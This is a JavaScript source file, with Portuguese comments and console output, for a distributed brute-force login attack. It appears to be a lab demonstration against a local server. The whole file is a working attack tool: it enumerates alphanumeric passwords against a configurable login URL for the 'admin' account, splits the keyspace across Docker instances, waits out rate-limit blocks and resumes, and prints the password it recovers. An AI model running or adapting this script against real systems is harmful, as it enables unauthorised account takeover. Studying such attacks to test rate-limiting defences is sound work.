const FULL_CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const USERNAME = "admin";
const LOG_EVERY = 200;

// Configuração via variáveis de ambiente (usadas pelo Docker)
// Se não houver variável, usa o charset completo (execução local normal)
const START_INDEX = parseInt(process.env.START_INDEX ?? "0");
const END_INDEX = parseInt(process.env.END_INDEX ?? String(FULL_CHARSET.length - 1));
const SERVER_URL = process.env.SERVER_URL || "http://localhost:3000/login";
const ATTACKER_ID = process.env.ATTACKER_ID || "local";

// Charset desta instância: fatia do charset completo
const CHARSET = FULL_CHARSET.slice(START_INDEX, END_INDEX + 1);

function formatTime(ms) {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const m = Math.floor(ms / 60000);
  const s = String(Math.floor((ms % 60000) / 1000)).padStart(2, "0");
  return `${m}m${s}s`;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Gera a próxima senha em ordem lexicográfica dentro do charset desta instância.
// Retorna null quando todas as combinações daquele tamanho acabarem.
function nextPassword(current, charset) {
  const digits = current.split("").map((c) => charset.indexOf(c));
  let i = digits.length - 1;

  while (i >= 0) {
    if (digits[i] < charset.length - 1) {
      digits[i]++;
      return digits.map((d) => charset[d]).join("");
    }
    digits[i] = 0;
    i--;
  }

  return null;
}

function firstPassword(length, charset) {
  return charset[0].repeat(length);
}

function totalForLength(length, charsetSize) {
  return charsetSize ** length;
}

async function tryLogin(password) {
  const response = await fetch(SERVER_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: USERNAME, password })
  });

  const data = await response.json();
  return { response, data };
}

async function main() {
  console.log(`\n${"=".repeat(52)}`);
  console.log(`   ATACANTE #${ATTACKER_ID} — FORÇA BRUTA DISTRIBUÍDA`);
  console.log(`${"=".repeat(52)}`);
  console.log(`Servidor:  ${SERVER_URL}`);
  console.log(`Usuário:   ${USERNAME}`);
  console.log(`Charset:   "${CHARSET}" (${CHARSET.length} chars — índices ${START_INDEX}–${END_INDEX})`);
  console.log(`Ordem:     1 dígito → 2 dígitos → 3 dígitos → …`);
  console.log(`${"=".repeat(52)}\n`);

  const startTime = Date.now();
  let totalAttempts = 0;

  for (let length = 1; ; length++) {
    const total = totalForLength(length, CHARSET.length);

    console.log(`\n── [#${ATTACKER_ID}] Comprimento ${length} ──  ${total.toLocaleString("pt-BR")} combinações`);

    let password = firstPassword(length, CHARSET);

    while (password !== null) {
      totalAttempts++;

      try {
        const { response, data } = await tryLogin(password);
        const elapsed = Date.now() - startTime;
        const rate = Math.round(totalAttempts / (elapsed / 1000)) || 0;

        if (totalAttempts % LOG_EVERY === 0 || data.success || response.status === 429) {
          console.log(
            `[#${ATTACKER_ID}][${String(totalAttempts).padStart(7)}]  "${password}"` +
            `  HTTP ${response.status}  ${formatTime(elapsed)}  ${rate} t/s`
          );
        }

        if (data.success) {
          const elapsed = Date.now() - startTime;
          const rate = Math.round(totalAttempts / (elapsed / 1000));

          console.log(`\n${"=".repeat(52)}`);
          console.log(`  [#${ATTACKER_ID}] SENHA ENCONTRADA: "${password}"`);
          console.log(`  Comprimento:  ${password.length} caractere${password.length !== 1 ? "s" : ""}`);
          console.log(`  Tentativas:   ${totalAttempts.toLocaleString("pt-BR")}`);
          console.log(`  Tempo total:  ${formatTime(elapsed)}`);
          console.log(`  Taxa média:   ${rate} tentativas/segundo`);
          console.log(`${"=".repeat(52)}\n`);
          return;
        }

        if (response.status === 429) {
          const waitMs = (data.remainingBlockMs || 15000) + 500;
          console.log(`\n[#${ATTACKER_ID}][BLOQUEIO] Aguardando ${Math.ceil(waitMs / 1000)}s...`);
          await sleep(waitMs);
          console.log(`[#${ATTACKER_ID}][RETOMANDO]\n`);
          continue;
        }
      } catch (err) {
        console.error(`\n[#${ATTACKER_ID}] Erro de conexão:`, err.message);
        console.error("Verifique se o servidor está rodando.\n");
        return;
      }

      password = nextPassword(password, CHARSET);
    }

    console.log(`   [#${ATTACKER_ID}] Comprimento ${length} esgotado.`);
  }
}

main().catch(console.error);
